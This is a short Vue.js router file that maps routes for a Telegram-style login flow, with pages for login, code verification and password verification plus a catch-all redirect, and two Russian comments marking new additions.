import { createRouter, createWebHistory } from 'vue-router';
import TelegramLogin from '../components/TelegramLogin.vue';
import TelegramCodeVerification from '../components/TelegramCodeVerification.vue';
import TelegramPasswordVerification from '../components/TelegramPasswordVerification.vue'; // НОВЫЙ ИМПОРТ

const routes = [
  {
    path: '/',
    name: 'Login',
    component: TelegramLogin,
  },
  {
    path: '/code',
    name: 'CodeVerification',
    component: TelegramCodeVerification,
  },
  {
    path: '/password', // НОВЫЙ МАРШРУТ
    name: 'PasswordVerification',
    component: TelegramPasswordVerification,
  },
  {
    path: '/:catchAll(.*)',
    redirect: '/',
  }
];

const router = createRouter({
  history: createWebHistory(),
  routes,
});

export default router;